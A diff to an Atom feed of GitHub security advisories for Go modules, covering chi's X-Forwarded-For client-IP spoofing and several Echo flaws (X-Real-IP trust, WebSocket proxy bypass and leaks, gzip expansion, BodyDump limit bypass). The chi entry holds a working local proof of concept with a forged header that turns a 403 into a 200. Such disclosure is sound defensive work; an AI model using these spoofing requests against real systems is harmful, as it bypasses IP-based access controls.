@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-10-23T20:45:42.676Z</updated>
+    <updated>2026-10-23T23:38:16.405Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,406 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/go-chi/chi/v5] chi: Client IP spoofing in ClientIPFromXFF via X-Forwarded-For]]></title>
+        <id>https://github.com/advisories/GHSA-j6qf-3m9c-vwj3</id>
+        <link href="https://github.com/advisories/GHSA-j6qf-3m9c-vwj3"/>
+        <updated>2026-10-23T20:56:47.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>ClientIPFromXFF</code> skips any <code>X-Forwarded-For</code> entry in a configured trusted CIDR but never verifies that the direct TCP peer in <code>http.Request.RemoteAddr</code> belongs to that CIDR. A client that can reach the Go server directly can therefore append a trusted-looking proxy address and choose the client IP returned by <code>middleware.GetClientIP</code>.</p>
+<p>The attack is remote and requires one unauthenticated HTTP request with no user interaction (AV:N/AC:L/PR:N/UI:N). It changes security decisions and exposes one protected handler within the same application (S:U/C:L/I:L); no availability loss was observed (A:N).</p>
+<p><strong>Preconditions:</strong> The application uses <code>ClientIPFromXFF</code> and makes the origin server reachable by an anonymous client outside the configured trusted-proxy CIDRs. No victim interaction is required.</p>
+<ol>
+<li>Send <code>GET /admin</code> directly to the origin with no <code>X-Forwarded-For</code> header.</li>
+<li>Observe a <code>403 Forbidden</code> response and an empty derived client IP.</li>
+<li>Repeat the request with <code>X-Forwarded-For: 10.0.0.7, 198.51.100.42</code>.</li>
+<li>Observe <code>200 OK</code> and <code>client-ip="10.0.0.7"</code>. Expected: the untrusted direct peer prevents the forwarding chain from being accepted.</li>
+</ol>
+<h3 id="details">Details</h3>
+<p>The vulnerable code is <code>ClientIPFromXFF</code> in <code>middleware/client_ip.go</code>, lines 93-116 at the tested revision. It calls <code>walkXFF</code> with only the attacker-controlled header, skips every entry that matches a trusted prefix, and stores the first remaining address:</p>
+<pre><code class="language-go">walkXFF(r.Header[xForwardedForHeader], func(v string) bool {
+    ip, ok := parseHeaderAddr(v)
+    if !ok {
+        return true
+    }
+    if inAnyPrefix(ip, prefixes) {
+        return false
+    }
+    found = ip
+    return true
+})
+</code></pre>
+<p>The function does not parse <code>r.RemoteAddr</code> before this walk. Consequently, the configured CIDRs identify trusted strings inside <code>X-Forwarded-For</code>, but do not establish that the immediate sender is one of those trusted proxies.</p>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<p>Using Go 1.24 or later, create and run this minimal application against the tested revision:</p>
+<pre><code class="language-sh">mkdir chi-clientip-poc
+cd chi-clientip-poc
+go mod init clientip-poc
+go get github.com/go-chi/chi/v5@167e1e3bd039d060696b99c8da4e876ae04f42c1
+cat &gt; main.go &lt;&lt;'EOF'
+package main
+
+import (
+    "fmt"
+    "log"
+    "net/http"
+
+    "github.com/go-chi/chi/v5"
+    "github.com/go-chi/chi/v5/middleware"
+)
+
+const allowedIP = "10.0.0.7"
+
+func main() {
+    r := chi.NewRouter()
+    r.Use(middleware.ClientIPFromXFF("198.51.100.0/24"))
+    r.Get("/admin", func(w http.ResponseWriter, r *http.Request) {
+        clientIP := middleware.GetClientIP(r.Context())
+        if clientIP != allowedIP {
+            http.Error(w, fmt.Sprintf("denied: tcp-peer=%q client-ip=%q", r.RemoteAddr, clientIP), http.StatusForbidden)
+            return
+        }
+        fmt.Fprintf(w, "allowed: tcp-peer=%q client-ip=%q\n", r.RemoteAddr, clientIP)
+    })
+
+    log.Print("listening on http://127.0.0.1:3001")
+    log.Fatal(http.ListenAndServe("127.0.0.1:3001", r))
+}
+EOF
+go run .
+</code></pre>
+<p>The no-header control was rejected:</p>
+<pre><code class="language-console">$ curl --http1.1 -i http://127.0.0.1:3001/admin
+HTTP/1.1 403 Forbidden
+Content-Type: text/plain; charset=utf-8
+X-Content-Type-Options: nosniff
+Date: Tue, 06 Oct 2026 15:46:27 GMT
+Content-Length: 48
+
+denied: tcp-peer="127.0.0.1:54416" client-ip=""
+</code></pre>
+<p>Adding the forged chain authorized the same direct client:</p>
+<pre><code class="language-console">$ curl --http1.1 -i -H 'X-Forwarded-For: 10.0.0.7, 198.51.100.42' http://127.0.0.1:3001/admin
+HTTP/1.1 200 OK
+Date: Tue, 06 Oct 2026 15:46:33 GMT
+Content-Length: 57
+Content-Type: text/plain; charset=utf-8
+
+allowed: tcp-peer="127.0.0.1:54417" client-ip="10.0.0.7"
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>I made an anonymous direct connection from <code>127.0.0.1</code>, supplied a header that ended in a different trusted-proxy CIDR, and caused the application to treat my client IP as the allowlisted <code>10.0.0.7</code>. This changed the authorization decision from <code>403 Forbidden</code> to <code>200 OK</code> for the protected handler.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/go-chi/chi/security/advisories/GHSA-j6qf-3m9c-vwj3">https://github.com/go-chi/chi/security/advisories/GHSA-j6qf-3m9c-vwj3</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-114437">https://nvd.nist.gov/vuln/detail/CVE-2026-114437</a></li>
+<li><a href="https://github.com/go-chi/chi/pull/1214">https://github.com/go-chi/chi/pull/1214</a></li>
+<li><a href="https://github.com/go-chi/chi/commit/7f9b7448f51d28804fac98c0a17bc2a7cec1079f">https://github.com/go-chi/chi/commit/7f9b7448f51d28804fac98c0a17bc2a7cec1079f</a></li>
+<li><a href="https://github.com/go-chi/chi/releases/tag/v5.4.0">https://github.com/go-chi/chi/releases/tag/v5.4.0</a></li>
+<li><a href="https://www.tenable.com/security/research/tra-2026-66">https://www.tenable.com/security/research/tra-2026-66</a></li>
+<li><a href="https://github.com/advisories/GHSA-j6qf-3m9c-vwj3">https://github.com/advisories/GHSA-j6qf-3m9c-vwj3</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-j6qf-3m9c-vwj3</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-10-23T20:56:46.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/go-chi/chi/v5] Duplicate Advisory: chi: Client IP spoofing in ClientIPFromXFF via X-Forwarded-For]]></title>
+        <id>https://github.com/advisories/GHSA-7cgw-qmxx-7fc2</id>
+        <link href="https://github.com/advisories/GHSA-7cgw-qmxx-7fc2"/>
+        <updated>2026-10-23T20:56:30.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
+<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-j6qf-3m9c-vwj3. This link is maintained to preserve external references.</p>
+<h2 id="original-description">Original Description</h2>
+<p>In the Golang Chi web framework, the ClientIPFromXFF middleware skips any X-Forwarded-For entry in a configured trusted CIDR but never verifies that the direct TCP peer in http.Request.RemoteAddr belongs to that CIDR. A client that can reach the Go server directly can therefore append a trusted-looking proxy address and choose the client IP returned by middleware.GetClientIP.</p>
+<p>This issue affects chi before 5.4.0.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/go-chi/chi/security/advisories/GHSA-j6qf-3m9c-vwj3">https://github.com/go-chi/chi/security/advisories/GHSA-j6qf-3m9c-vwj3</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-114437">https://nvd.nist.gov/vuln/detail/CVE-2026-114437</a></li>
+<li><a href="https://www.tenable.com/security/research/tra-2026-66">https://www.tenable.com/security/research/tra-2026-66</a></li>
+<li><a href="https://github.com/advisories/GHSA-7cgw-qmxx-7fc2">https://github.com/advisories/GHSA-7cgw-qmxx-7fc2</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7cgw-qmxx-7fc2</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-10-21T15:42:31.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/labstack/echo/v5] Echo: X-Real-IP extractor trusts the header value instead of the sending peer]]></title>
+        <id>https://github.com/advisories/GHSA-h53f-rm2w-w7rg</id>
+        <link href="https://github.com/advisories/GHSA-h53f-rm2w-w7rg"/>
+        <updated>2026-10-23T20:50:27.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
+<p>In Echo v5, <code>ExtractIPFromRealIPHeader</code> checked whether the address supplied in <code>X-Real-IP</code> belonged to a trusted range instead of checking the address of the direct network peer. An untrusted client could therefore supply a loopback or private address and have it returned by <code>c.RealIP()</code> with the extractor's default trust options.</p>
+<p>Applications using this extractor for IP allowlists, IP-based rate limiting, audit logs or forwarding headers could accept a spoofed client identity. Exploitation requires that the attacker can reach Echo directly or that an intervening proxy passes through the attacker's <code>X-Real-IP</code> value. Applications using the default direct IP extractor are unaffected. Echo v4 is unaffected by this v5 regression.</p>
+<h2 id="affected-versions-and-patch">Affected versions and patch</h2>
+<p>All v5 releases from v5.0.0 through v5.4.0 are affected. Upgrade to <a href="https://github.com/labstack/echo/releases/tag/v5.4.1">v5.4.1</a>.</p>
+<p>The patch validates the direct peer before accepting a syntactically valid <code>X-Real-IP</code> value, restoring the v4 trust model. <a href="https://github.com/labstack/echo/commit/1855061e572ae9dab727c811d8382f266bfbaaec">Fix commit</a>.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>Use <code>ExtractIPDirect</code> until upgrading, or ensure that only trusted proxies can reach Echo and that they replace client-supplied forwarding headers. Configure trusted proxy ranges narrowly for the deployment.</p>
+<h2 id="credits">Credits</h2>
+<p>Reported and patched by @rm-Umar. @Duodum independently reported the same issue in GHSA-c3r7-8j36-7mx8, which is tracked as a duplicate of this advisory.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/labstack/echo/security/advisories/GHSA-h53f-rm2w-w7rg">https://github.com/labstack/echo/security/advisories/GHSA-h53f-rm2w-w7rg</a></li>
+<li><a href="https://github.com/labstack/echo/commit/1855061e572ae9dab727c811d8382f266bfbaaec">https://github.com/labstack/echo/commit/1855061e572ae9dab727c811d8382f266bfbaaec</a></li>
+<li><a href="https://github.com/labstack/echo/releases/tag/v5.4.1">https://github.com/labstack/echo/releases/tag/v5.4.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-h53f-rm2w-w7rg">https://github.com/advisories/GHSA-h53f-rm2w-w7rg</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-h53f-rm2w-w7rg</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-10-23T20:50:25.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/labstack/echo/v5] Echo: WebSocket proxy can retain connections and handlers after client disconnect]]></title>
+        <id>https://github.com/advisories/GHSA-9969-6676-49h5</id>
+        <link href="https://github.com/advisories/GHSA-9969-6676-49h5"/>
+        <updated>2026-10-23T20:50:18.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
+<p>Echo's Proxy middleware could retain a handler, copy goroutines and network connections after a WebSocket client disconnected if the upstream kept its connection open. The raw proxy waited for both copy directions to finish without reliably closing the other connection when one direction ended. Rejected upgrade responses with HTTP keep-alive were one way to trigger this behavior.</p>
+<p>Repeated connections can accumulate resources and cause denial of service. The impact depends on the proxy route's accessibility, upstream behavior and configured connection deadlines. This is a medium-severity resource-retention issue; no confidentiality or integrity impact is claimed.</p>
+<h2 id="affected-versions-and-patch">Affected versions and patch</h2>
+<p>Affected versions are v4.15.0 through v4.16.0 and v5.0.0 through v5.4.0. The regression was introduced by commit e2133320c7, merged in #2852.</p>
+<p>Upgrade to <a href="https://github.com/labstack/echo/releases/tag/v4.16.1">v4.16.1</a> or <a href="https://github.com/labstack/echo/releases/tag/v5.4.1">v5.4.1</a>. The patch uses Go's HTTP reverse proxy, preserves ordinary HTTP handling for rejected upgrades, and closes both sides of a WebSocket tunnel when either direction ends. It also covers an upstream that receives client EOF but deliberately keeps its side open.</p>
+<p>Fix commits: <a href="https://github.com/labstack/echo/commit/3fb0ba7e17645bb65611e2a08875d0a2f65c421f">v4</a>, <a href="https://github.com/labstack/echo/commit/1855061e572ae9dab727c811d8382f266bfbaaec">v5</a>.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>Disable WebSocket proxy routes until upgrading, or apply bounded connection lifetimes and resource limits at the frontend and upstream. Server idle timeouts alone may not cover hijacked WebSocket connections.</p>
+<h2 id="credits">Credits</h2>
+<p>Reported by @irisitymichaelgrundberg.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/labstack/echo/security/advisories/GHSA-9969-6676-49h5">https://github.com/labstack/echo/security/advisories/GHSA-9969-6676-49h5</a></li>
+<li><a href="https://github.com/labstack/echo/commit/1855061e572ae9dab727c811d8382f266bfbaaec">https://github.com/labstack/echo/commit/1855061e572ae9dab727c811d8382f266bfbaaec</a></li>
+<li><a href="https://github.com/labstack/echo/commit/3fb0ba7e17645bb65611e2a08875d0a2f65c421f">https://github.com/labstack/echo/commit/3fb0ba7e17645bb65611e2a08875d0a2f65c421f</a></li>
+<li><a href="https://github.com/labstack/echo/releases/tag/v4.16.1">https://github.com/labstack/echo/releases/tag/v4.16.1</a></li>
+<li><a href="https://github.com/labstack/echo/releases/tag/v5.4.1">https://github.com/labstack/echo/releases/tag/v5.4.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-9969-6676-49h5">https://github.com/advisories/GHSA-9969-6676-49h5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9969-6676-49h5</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-10-23T20:50:17.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/labstack/echo/v4] Echo: WebSocket proxy can retain connections and handlers after client disconnect]]></title>
+        <id>https://github.com/advisories/GHSA-9969-6676-49h5</id>
+        <link href="https://github.com/advisories/GHSA-9969-6676-49h5"/>
+        <updated>2026-10-23T20:50:18.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
+<p>Echo's Proxy middleware could retain a handler, copy goroutines and network connections after a WebSocket client disconnected if the upstream kept its connection open. The raw proxy waited for both copy directions to finish without reliably closing the other connection when one direction ended. Rejected upgrade responses with HTTP keep-alive were one way to trigger this behavior.</p>
+<p>Repeated connections can accumulate resources and cause denial of service. The impact depends on the proxy route's accessibility, upstream behavior and configured connection deadlines. This is a medium-severity resource-retention issue; no confidentiality or integrity impact is claimed.</p>
+<h2 id="affected-versions-and-patch">Affected versions and patch</h2>
+<p>Affected versions are v4.15.0 through v4.16.0 and v5.0.0 through v5.4.0. The regression was introduced by commit e2133320c7, merged in #2852.</p>
+<p>Upgrade to <a href="https://github.com/labstack/echo/releases/tag/v4.16.1">v4.16.1</a> or <a href="https://github.com/labstack/echo/releases/tag/v5.4.1">v5.4.1</a>. The patch uses Go's HTTP reverse proxy, preserves ordinary HTTP handling for rejected upgrades, and closes both sides of a WebSocket tunnel when either direction ends. It also covers an upstream that receives client EOF but deliberately keeps its side open.</p>
+<p>Fix commits: <a href="https://github.com/labstack/echo/commit/3fb0ba7e17645bb65611e2a08875d0a2f65c421f">v4</a>, <a href="https://github.com/labstack/echo/commit/1855061e572ae9dab727c811d8382f266bfbaaec">v5</a>.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>Disable WebSocket proxy routes until upgrading, or apply bounded connection lifetimes and resource limits at the frontend and upstream. Server idle timeouts alone may not cover hijacked WebSocket connections.</p>
+<h2 id="credits">Credits</h2>
+<p>Reported by @irisitymichaelgrundberg.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/labstack/echo/security/advisories/GHSA-9969-6676-49h5">https://github.com/labstack/echo/security/advisories/GHSA-9969-6676-49h5</a></li>
+<li><a href="https://github.com/labstack/echo/commit/1855061e572ae9dab727c811d8382f266bfbaaec">https://github.com/labstack/echo/commit/1855061e572ae9dab727c811d8382f266bfbaaec</a></li>
+<li><a href="https://github.com/labstack/echo/commit/3fb0ba7e17645bb65611e2a08875d0a2f65c421f">https://github.com/labstack/echo/commit/3fb0ba7e17645bb65611e2a08875d0a2f65c421f</a></li>
+<li><a href="https://github.com/labstack/echo/releases/tag/v4.16.1">https://github.com/labstack/echo/releases/tag/v4.16.1</a></li>
+<li><a href="https://github.com/labstack/echo/releases/tag/v5.4.1">https://github.com/labstack/echo/releases/tag/v5.4.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-9969-6676-49h5">https://github.com/advisories/GHSA-9969-6676-49h5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9969-6676-49h5</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-10-23T20:50:17.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/labstack/echo/v4] Echo: Decompress permits unbounded gzip expansion in v4]]></title>
+        <id>https://github.com/advisories/GHSA-h7wr-284f-5qvc</id>
+        <link href="https://github.com/advisories/GHSA-h7wr-284f-5qvc"/>
+        <updated>2026-10-23T20:49:50.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
+<p>Echo v4's opt-in Decompress middleware exposed a gzip-decoded request stream without limiting its expanded size. A small compressed request could therefore produce a very large decoded body. Handlers that read or bind that body could consume excessive memory or CPU, and repeated or concurrent requests could cause denial of service.</p>
+<p>The middleware is not enabled by default. A limit on the compressed request size alone does not bound the decompressed size. Applications that already apply an effective body limit after decompression have reduced exposure.</p>
+<h2 id="affected-versions-and-patch">Affected versions and patch</h2>
+<p>Echo v4 versions through v4.16.0 are affected. Upgrade to <a href="https://github.com/labstack/echo/releases/tag/v4.16.1">v4.16.1</a>.</p>
+<p>The patch adds <code>DecompressConfig.MaxDecompressedSize</code>, defaulting to 100 MiB when zero. A value of <code>-1</code> explicitly disables the limit. Reading beyond the cap returns <code>ErrStatusRequestEntityTooLarge</code> (HTTP 413), including through JSON and XML binding. Bodies exactly at the configured limit remain valid. Streaming enforcement requires callers to handle body-read errors.</p>
+<p><a href="https://github.com/labstack/echo/commit/3fb0ba7e17645bb65611e2a08875d0a2f65c421f">Fix commit</a>.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>Disable gzip request decompression on exposed routes, or place BodyLimit after Decompress so the application limit applies to decoded bytes. Apply suitable request deadlines and concurrency limits as well.</p>
+<h2 id="credits">Credits</h2>
+<p>Reported by @q490107865. The exact-limit behavior incorporates @Shubham-Padkonde's work in <a href="https://github.com/labstack/echo/pull/3136">#3136</a>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/labstack/echo/security/advisories/GHSA-h7wr-284f-5qvc">https://github.com/labstack/echo/security/advisories/GHSA-h7wr-284f-5qvc</a></li>
+<li><a href="https://github.com/labstack/echo/pull/3136">https://github.com/labstack/echo/pull/3136</a></li>
+<li><a href="https://github.com/labstack/echo/commit/3fb0ba7e17645bb65611e2a08875d0a2f65c421f">https://github.com/labstack/echo/commit/3fb0ba7e17645bb65611e2a08875d0a2f65c421f</a></li>
+<li><a href="https://github.com/labstack/echo/releases/tag/v4.16.1">https://github.com/labstack/echo/releases/tag/v4.16.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-h7wr-284f-5qvc">https://github.com/advisories/GHSA-h7wr-284f-5qvc</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-h7wr-284f-5qvc</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-10-23T20:49:49.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/labstack/echo/v5] Echo: Rejected WebSocket upgrades can bypass Echo route-level access controls]]></title>
+        <id>https://github.com/advisories/GHSA-cxf3-9h37-7rr8</id>
+        <link href="https://github.com/advisories/GHSA-cxf3-9h37-7rr8"/>
+        <updated>2026-10-23T20:49:38.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
+<p>Echo's Proxy middleware selected a raw tunnel when the client requested a WebSocket upgrade, before validating whether the configured upstream accepted it. If the upstream returned an ordinary HTTP response and kept the connection alive, subsequent HTTP requests on that connection were forwarded directly to the same upstream without passing through Echo's router or route-specific middleware.</p>
+<p>This can bypass authentication or authorization enforced only at Echo's routes. Exploitation requires an accessible proxy route, an upstream that rejects the upgrade without closing the connection, and a target resource on that upstream without independent authorization. The issue does not provide arbitrary-host proxying or bypass the upstream's own authentication.</p>
+<h2 id="affected-versions-and-patch">Affected versions and patch</h2>
+<p>The raw proxy implementation is present throughout the v4 and v5 release lines up to v4.16.0 and v5.4.0. Runtime reproductions confirmed v4.15.0, v4.16.0, v5.0.0 and v5.4.0; source history also shows the missing upgrade-response validation in v4.0.0.</p>
+<p>Upgrade to <a href="https://github.com/labstack/echo/releases/tag/v4.16.1">v4.16.1</a> or <a href="https://github.com/labstack/echo/releases/tag/v5.4.1">v5.4.1</a>. The patch routes WebSocket upgrades through Go's HTTP reverse proxy and enters a tunnel only after a valid upstream upgrade response. Rejected upgrades remain ordinary HTTP requests.</p>
+<p>Fix commits: <a href="https://github.com/labstack/echo/commit/3fb0ba7e17645bb65611e2a08875d0a2f65c421f">v4</a>, <a href="https://github.com/labstack/echo/commit/1855061e572ae9dab727c811d8382f266bfbaaec">v5</a>.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>Reject WebSocket upgrade requests before they reach affected Echo proxy routes, or enforce authorization independently at every upstream resource. Merely returning a non-101 response from the upstream does not prevent the vulnerable raw tunnel.</p>
+<h2 id="credits">Credits</h2>
+<p>Reported by @Duodum.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/labstack/echo/security/advisories/GHSA-cxf3-9h37-7rr8">https://github.com/labstack/echo/security/advisories/GHSA-cxf3-9h37-7rr8</a></li>
+<li><a href="https://github.com/labstack/echo/commit/1855061e572ae9dab727c811d8382f266bfbaaec">https://github.com/labstack/echo/commit/1855061e572ae9dab727c811d8382f266bfbaaec</a></li>
+<li><a href="https://github.com/labstack/echo/commit/3fb0ba7e17645bb65611e2a08875d0a2f65c421f">https://github.com/labstack/echo/commit/3fb0ba7e17645bb65611e2a08875d0a2f65c421f</a></li>
+<li><a href="https://github.com/labstack/echo/releases/tag/v4.16.1">https://github.com/labstack/echo/releases/tag/v4.16.1</a></li>
+<li><a href="https://github.com/labstack/echo/releases/tag/v5.4.1">https://github.com/labstack/echo/releases/tag/v5.4.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-cxf3-9h37-7rr8">https://github.com/advisories/GHSA-cxf3-9h37-7rr8</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-cxf3-9h37-7rr8</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-10-23T20:49:37.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/labstack/echo/v4] Echo: Rejected WebSocket upgrades can bypass Echo route-level access controls]]></title>
+        <id>https://github.com/advisories/GHSA-cxf3-9h37-7rr8</id>
+        <link href="https://github.com/advisories/GHSA-cxf3-9h37-7rr8"/>
+        <updated>2026-10-23T20:49:38.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
+<p>Echo's Proxy middleware selected a raw tunnel when the client requested a WebSocket upgrade, before validating whether the configured upstream accepted it. If the upstream returned an ordinary HTTP response and kept the connection alive, subsequent HTTP requests on that connection were forwarded directly to the same upstream without passing through Echo's router or route-specific middleware.</p>
+<p>This can bypass authentication or authorization enforced only at Echo's routes. Exploitation requires an accessible proxy route, an upstream that rejects the upgrade without closing the connection, and a target resource on that upstream without independent authorization. The issue does not provide arbitrary-host proxying or bypass the upstream's own authentication.</p>
+<h2 id="affected-versions-and-patch">Affected versions and patch</h2>
+<p>The raw proxy implementation is present throughout the v4 and v5 release lines up to v4.16.0 and v5.4.0. Runtime reproductions confirmed v4.15.0, v4.16.0, v5.0.0 and v5.4.0; source history also shows the missing upgrade-response validation in v4.0.0.</p>
+<p>Upgrade to <a href="https://github.com/labstack/echo/releases/tag/v4.16.1">v4.16.1</a> or <a href="https://github.com/labstack/echo/releases/tag/v5.4.1">v5.4.1</a>. The patch routes WebSocket upgrades through Go's HTTP reverse proxy and enters a tunnel only after a valid upstream upgrade response. Rejected upgrades remain ordinary HTTP requests.</p>
+<p>Fix commits: <a href="https://github.com/labstack/echo/commit/3fb0ba7e17645bb65611e2a08875d0a2f65c421f">v4</a>, <a href="https://github.com/labstack/echo/commit/1855061e572ae9dab727c811d8382f266bfbaaec">v5</a>.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>Reject WebSocket upgrade requests before they reach affected Echo proxy routes, or enforce authorization independently at every upstream resource. Merely returning a non-101 response from the upstream does not prevent the vulnerable raw tunnel.</p>
+<h2 id="credits">Credits</h2>
+<p>Reported by @Duodum.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/labstack/echo/security/advisories/GHSA-cxf3-9h37-7rr8">https://github.com/labstack/echo/security/advisories/GHSA-cxf3-9h37-7rr8</a></li>
+<li><a href="https://github.com/labstack/echo/commit/1855061e572ae9dab727c811d8382f266bfbaaec">https://github.com/labstack/echo/commit/1855061e572ae9dab727c811d8382f266bfbaaec</a></li>
+<li><a href="https://github.com/labstack/echo/commit/3fb0ba7e17645bb65611e2a08875d0a2f65c421f">https://github.com/labstack/echo/commit/3fb0ba7e17645bb65611e2a08875d0a2f65c421f</a></li>
+<li><a href="https://github.com/labstack/echo/releases/tag/v4.16.1">https://github.com/labstack/echo/releases/tag/v4.16.1</a></li>
+<li><a href="https://github.com/labstack/echo/releases/tag/v5.4.1">https://github.com/labstack/echo/releases/tag/v5.4.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-cxf3-9h37-7rr8">https://github.com/advisories/GHSA-cxf3-9h37-7rr8</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-cxf3-9h37-7rr8</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-10-23T20:49:37.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/labstack/echo/v5] Echo: BodyDump can discard BodyLimit overflow errors for unknown-length requests]]></title>
+        <id>https://github.com/advisories/GHSA-x9ff-22gv-65f4</id>
+        <link href="https://github.com/advisories/GHSA-x9ff-22gv-65f4"/>
+        <updated>2026-10-23T20:49:12.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
+<p>Echo v5's BodyDump middleware captured a bounded prefix, drained the remaining request body while ignoring read errors, and then replaced the body with the captured prefix. With an outer BodyLimit, an unknown-length request such as an HTTP/1.1 chunked request, and a BodyDump capture limit below the BodyLimit threshold, an overflow detected during that drain could be discarded.</p>
+<p>The handler could consequently process a truncated request and return success even though the original body exceeded the configured limit. This is a conditional size-policy bypass; no general authentication bypass, production data modification or denial of service is claimed. Known-length requests rejected before BodyDump runs are unaffected by this path.</p>
+<h2 id="affected-versions-and-patch">Affected versions and patch</h2>
+<p>All v5 releases from v5.0.0 through v5.4.0 contain the affected drain-and-replace logic. Runtime reproduction confirmed v5.4.0; source comparison confirms the same request handling in v5.0.0.</p>
+<p>Upgrade to <a href="https://github.com/labstack/echo/releases/tag/v5.4.1">v5.4.1</a>. BodyDump now captures only the configured prefix for logging and reconstructs the handler's reader from that prefix plus the unread original stream. It preserves the original closer and read errors instead of silently draining the rest. <a href="https://github.com/labstack/echo/commit/1855061e572ae9dab727c811d8382f266bfbaaec">Fix commit</a>.</p>
+<p>Streaming BodyLimit enforcement still requires the application to consume the request body and handle read errors. The BodyDump capture cap is a logging cap, not an application body limit.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>Disable BodyDump on affected routes, or ensure the BodyLimit overflow is detected during the initial capture by setting the capture limit above the enforced body limit. Upgrading is recommended because it also preserves the complete body for handlers.</p>
+<h2 id="credits">Credits</h2>
+<p>Reported by @Duodum. The fix incorporates @jakezwang's request-body preservation work in <a href="https://github.com/labstack/echo/pull/3105">#3105</a>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/labstack/echo/security/advisories/GHSA-x9ff-22gv-65f4">https://github.com/labstack/echo/security/advisories/GHSA-x9ff-22gv-65f4</a></li>
+<li><a href="https://github.com/labstack/echo/pull/3105">https://github.com/labstack/echo/pull/3105</a></li>
+<li><a href="https://github.com/labstack/echo/commit/1855061e572ae9dab727c811d8382f266bfbaaec">https://github.com/labstack/echo/commit/1855061e572ae9dab727c811d8382f266bfbaaec</a></li>
+<li><a href="https://github.com/labstack/echo/releases/tag/v5.4.1">https://github.com/labstack/echo/releases/tag/v5.4.1</a></li>
